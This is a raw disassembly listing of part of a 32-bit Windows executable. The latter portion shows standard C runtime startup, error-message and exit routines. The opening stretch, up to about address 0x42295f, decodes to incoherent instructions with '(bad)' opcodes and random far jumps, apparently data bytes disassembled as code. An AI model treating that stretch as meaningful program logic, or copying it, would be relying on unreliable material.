  422648:	mov    eax,0xe70b41c6
  42264d:	dec    edx
  42264e:	daa    
  42264f:	inc    ebx
  422650:	daa    
  422651:	leave  
  422652:	pop    edi
  422653:	jns    0x42266f
  422655:	add    al,0x92
  422657:	leave  
  422658:	int3   
  422659:	shl    DWORD PTR [esi+0x14ce0d93],1
  42265f:	pop    ebx
  422660:	(bad)  
  422662:	aaa    
  422663:	jl     0x422652
  422665:	jge    0x4225f6
  422667:	shl    BYTE PTR [ebx-0x2071be82],1
  42266d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266e:	out    0xe3,eax
  422670:	xchg   DWORD PTR [edi+0x6a],esi
  422673:	inc    ebp
  422674:	aad    0x14
  422676:	jns    0x4226cd
  422678:	pandn  mm6,mm0
  42267b:	cmp    ebp,DWORD PTR cs:[esi-0x7f856e66]
  422682:	mov    dl,0x1c
  422684:	lds    edi,FWORD PTR [edx]
  422686:	inc    esp
  422687:	shr    eax,cl
  422689:	and    DWORD PTR [esi],0x124a57e9
  42268f:	mov    eax,ds:0xe7d1e0d6
  422694:	jecxz  0x4226f9
  422696:	sti    
  422697:	out    0xec,al
  422699:	pop    eax
  42269a:	lods   eax,DWORD PTR ds:[esi]
  42269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42269c:	mov    BYTE PTR [ebx],dl
  42269e:	mov    edx,ecx
  4226a0:	pop    ebp
  4226a1:	push   esi
  4226a2:	gs dec esp
  4226a4:	push   ds
  4226a5:	xchg   DWORD PTR [ebp-0x7252b725],ebp
  4226ab:	or     DWORD PTR [ecx+edx*4+0xf224eb5],edx
  4226b2:	fwait
  4226b3:	and    al,0x6b
  4226b5:	shr    DWORD PTR [esi-0x1e],cl
  4226b8:	add    bl,BYTE PTR [edi+ecx*8-0x655a7c00]
  4226bf:	pop    es
  4226c0:	(bad)  
  4226c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c2:	sahf   
  4226c3:	scas   al,BYTE PTR es:[edi]
  4226c4:	sbb    bl,BYTE PTR [edi-0x4542af08]
  4226ca:	sti    
  4226cb:	std    
  4226cc:	aas    
  4226cd:	adc    BYTE PTR ds:0xdda44342,bh
  4226d3:	loopne 0x422736
  4226d5:	adc    eax,esp
  4226d7:	pop    eax
  4226d8:	mov    ecx,0xe0efe67c
  4226dd:	pop    edi
  4226de:	fldcw  WORD PTR [ebx+0x7a]
  4226e1:	or     esi,ebx
  4226e3:	sbb    DWORD PTR [ebp-0x1],edi
  4226e6:	sbb    ebp,DWORD PTR [edx+0x7b]
  4226e9:	es jb  0x4226af
  4226ec:	mov    ds,WORD PTR [ebp-0x3bdc0fa5]
  4226f2:	test   BYTE PTR [ebx+0x55],cl
  4226f5:	jne    0x4226fa
  4226f7:	inc    edx
  4226f8:	(bad)  
  4226fa:	push   eax
  4226fb:	pop    ss
  4226fc:	ror    DWORD PTR [edx+0x678f369],1
  422702:	or     esp,DWORD PTR [ebp+0x358d858f]
  422708:	std    
  422709:	aaa    
  42270a:	inc    eax
  42270b:	push   0x42964e96
  422710:	mov    edi,0x27ee1114
  422715:	adc    ecx,0xffffffe8
  422718:	sub    BYTE PTR [esi],ah
  42271a:	push   ebx
  42271b:	dec    ebx
  42271c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42271d:	fs jne 0x4226cc
  422720:	mov    WORD PTR [ebp+0x4c],gs
  422723:	and    eax,0xfffffffb
  422726:	push   edi
  422727:	test   eax,0x3b341e30
  42272c:	pop    es
  42272d:	sbb    eax,0x112accb9
  422733:	mov    dh,0x18
  422735:	add    al,ch
  422737:	stc    
  422738:	mov    fs,WORD PTR [ebp-0x6e5dacd5]
  42273e:	xor    BYTE PTR [eax+ecx*1],al
  422741:	es sbb eax,0xa2bbdd42
  422747:	mov    esi,0x42b41c2d
  42274c:	jle    0x42270e
  42274e:	test   edi,0xd1fb5124
  422754:	cmp    BYTE PTR [eax+0x60],bl
  422757:	inc    esi
  422758:	mov    fs,esp
  42275a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42275b:	and    cl,dl
  42275d:	push   ds
  42275e:	sub    al,0x88
  422760:	ret    
  422761:	push   es
  422762:	mov    cl,0x12
  422764:	dec    esp
  422765:	mov    DWORD PTR [edx],ebx
  422767:	daa    
  422768:	lods   al,BYTE PTR ds:[esi]
  422769:	dec    edx
  42276a:	rcr    BYTE PTR [eax+0x6a7b2c39],0xfd
  422771:	test   eax,0xa8b3147a
  422776:	dec    esi
  422777:	mov    DWORD PTR [esi+ebp*1],ecx
  42277a:	mov    al,ds:0xcfc195a2
  42277f:	and    ebx,esp
  422781:	pop    edx
  422782:	dec    edx
  422783:	retf   0x4288
  422786:	mov    WORD PTR [ecx],cs
  422788:	shl    BYTE PTR [eax+0x3a60160e],0x92
  42278f:	cli    
  422790:	dec    eax
  422791:	lahf   
  422792:	mov    cl,0xcb
  422794:	inc    eax
  422795:	lods   al,BYTE PTR ds:[esi]
  422796:	jl     0x422740
  422798:	jge    0x42272f
  42279a:	test   BYTE PTR [esp+eiz*8-0xad31e69],bh
  4227a1:	enter  0x2726,0x46
  4227a5:	xchg   edx,eax
  4227a6:	pusha  
  4227a7:	inc    ebp
  4227a8:	inc    ecx
  4227a9:	imul   DWORD PTR [esi+0x1cb8c4a]
  4227af:	daa    
  4227b0:	jecxz  0x4227c7
  4227b2:	adc    eax,0x72d899b7
  4227b7:	mov    esi,0x4175cc91
  4227bc:	xchg   esi,eax
  4227bd:	pushf  
  4227be:	mov    ds:0xc40b8596,al
  4227c3:	cmp    bh,al
  4227c5:	add    al,0x7a
  4227c7:	jne    0x4227d5
  4227c9:	cld    
  4227ca:	xchg   DWORD PTR [edi-0x2719eaa6],ebp
  4227d0:	cmp    BYTE PTR [edx+eax*8-0x19d8307a],ch
  4227d7:	and    edx,esp
  4227d9:	adc    BYTE PTR [esp+ecx*4-0x1f],cl
  4227dd:	rol    ecx,cl
  4227df:	ss xchg esi,eax
  4227e1:	ficomp DWORD PTR [esi]
  4227e3:	pop    ds
  4227e4:	jne    0x42284e
  4227e6:	(bad)  
  4227e7:	test   eax,0x16adb8be
  4227ec:	js     0x422801
  4227ee:	loope  0x4227f6
  4227f0:	(bad)  
  4227f1:	cmp    BYTE PTR [eax+eax*8],dh
  4227f4:	int3   
  4227f5:	into   
  4227f6:	xor    bh,dl
  4227f8:	inc    DWORD PTR [ecx+0x73]
  4227fb:	jmp    0xae4f:0x634d335
  422802:	xor    edi,esi
  422804:	(bad)  
  422807:	pop    esp
  422808:	jno    0x42286f
  42280a:	mov    al,0x51
  42280c:	lods   eax,DWORD PTR ds:[esi]
  42280d:	stos   BYTE PTR es:[edi],al
  42280e:	jmp    0x761b6093
  422813:	int    0xad
  422815:	iret   
  422816:	pop    esi
  422817:	outs   dx,DWORD PTR ds:[esi]
  422818:	and    al,0xe7
  42281a:	mov    eax,0xf3a98aa2
  42281f:	(bad)  
  422820:	adc    esi,DWORD PTR [ebp+0x5a3c8bc5]
  422826:	scas   al,BYTE PTR es:[edi]
  422827:	jmp    0x64ca:0x4a0b1774
  42282e:	test   BYTE PTR ds:0x15985dd1,bh
  422834:	lods   eax,DWORD PTR ds:[esi]
  422835:	xchg   edi,eax
  422836:	cli    
  422837:	call   FWORD PTR [ecx+0x66]
  42283a:	inc    eax
  42283b:	cmc    
  42283c:	mov    ecx,0xc2dfc82e
  422841:	xor    al,0x2
  422843:	push   ebx
  422844:	mov    eax,0x1413073
  422849:	std    
  42284a:	push   edi
  42284b:	and    ebp,DWORD PTR ds:0x137625ff
  422851:	jb     0x422808
  422853:	sbb    al,0xd1
  422855:	sub    esi,DWORD PTR [ebp-0x25]
  422858:	repz les ebp,FWORD PTR ds:0x80429452
  42285f:	data16 aaa 
  422861:	fiadd  DWORD PTR [esp+edi*2]
  422864:	jmp    0x4922:0x86a82c7b
  42286b:	mov    edi,0x2ed43ca6
  422870:	jnp    0x42289b
  422872:	aaa    
  422873:	jmp    0xcdc5:0xe105e23f
  42287a:	xchg   edi,eax
  42287b:	push   edx
  42287c:	adc    DWORD PTR [ebx],eax
  42287e:	add    BYTE PTR [edi-0x58e1323c],bh
  422884:	mov    ds:0xb16742a5,eax
  422889:	xor    esp,DWORD PTR [eax+0x6c1608e3]
  42288f:	dec    ebp
  422890:	xor    eax,0x9421f943
  422895:	add    al,BYTE PTR [ebp-0xf7bbb8e]
  42289b:	pop    ebp
  42289c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42289d:	jae    0x422834
  42289f:	test   al,0x4b
  4228a1:	jnp    0x422838
  4228a3:	sbb    BYTE PTR [edx-0x15389f84],al
  4228a9:	xor    al,0xa6
  4228ab:	outs   dx,DWORD PTR ds:[esi]
  4228ac:	xchg   edi,eax
  4228ad:	arpl   si,si
  4228af:	jmp    0x422925
  4228b1:	lea    ebx,[eax]
  4228b3:	push   ecx
  4228b4:	sbb    eax,0x79beb4e7
  4228b9:	ret    
  4228ba:	push   edx
  4228bb:	pop    ebx
  4228bc:	fstp   TBYTE PTR [ebx]
  4228be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228bf:	lods   al,BYTE PTR ds:[esi]
  4228c0:	pop    es
  4228c1:	call   DWORD PTR [ebp-0x4c]
  4228c4:	popf   
  4228c5:	jle    0x422932
  4228c7:	fwait
  4228c8:	mov    ch,0xe0
  4228ca:	es add al,0x20
  4228cd:	xchg   BYTE PTR [eax-0x41],ah
  4228d0:	pop    ebx
  4228d1:	popa   
  4228d2:	out    0xff,eax
  4228d4:	xchg   esp,eax
  4228d5:	dec    ebx
  4228d6:	jmp    0x422923
  4228d8:	(bad)  
  4228da:	add    esi,DWORD PTR [ebp+ebx*8+0x797d1e39]
  4228e1:	mov    ebp,0x1a340c4a
  4228e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228e7:	int    0x78
  4228e9:	add    ch,bl
  4228eb:	adc    eax,0x2868f7c1
  4228f0:	adc    DWORD PTR ds:0xf4c50df5,edi
  4228f6:	adc    eax,DWORD PTR [edi-0x131261fa]
  4228fc:	mov    bl,BYTE PTR gs:[edi-0x58e6e42d]
  422903:	loopne 0x4228db
  422905:	cmp    ebp,DWORD PTR [ebx]
  422907:	addr16 mov ebx,0x171fd944
  42290d:	je     0x4228fc
  42290f:	push   edi
  422910:	aaa    
  422911:	shld   ebx,edi,0xf4
  422915:	(bad)  
  422916:	cmp    al,0x59
  422918:	xchg   ecx,eax
  422919:	xchg   edx,eax
  42291a:	gs scas al,BYTE PTR es:[edi]
  42291c:	(bad)  
  42291e:	jae    0x4228c2
  422920:	call   0xceadc8dc
  422925:	in     eax,dx
  422926:	in     al,dx
  422927:	mov    cl,0x6e
  422929:	ds xchg ebp,eax
  42292b:	jge    0x42295f
  42292d:	clc    
  42292e:	outs   dx,DWORD PTR ds:[esi]
  42292f:	leave  
  422930:	inc    ebp
  422931:	sub    ebp,DWORD PTR [esi-0x5a8215b8]
  422937:	cwde   
  422938:	jo     0x42294b
  42293a:	(bad)  [edx-0x23]
  42293d:	sbb    BYTE PTR [ebx],dl
  42293f:	mov    esp,DWORD PTR [ebx-0xd]
  422942:	lods   eax,DWORD PTR ds:[esi]
  422943:	cmp    eax,0xbd46eb98
  422948:	fistp  QWORD PTR [edx-0x583d4da2]
  42294e:	mov    ds:0x6f5b6bb6,al
  422953:	stc    
  422954:	push   0xffffffda
  422956:	fcmovbe st,st(5)
  422958:	and    ebx,DWORD PTR [ecx]
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
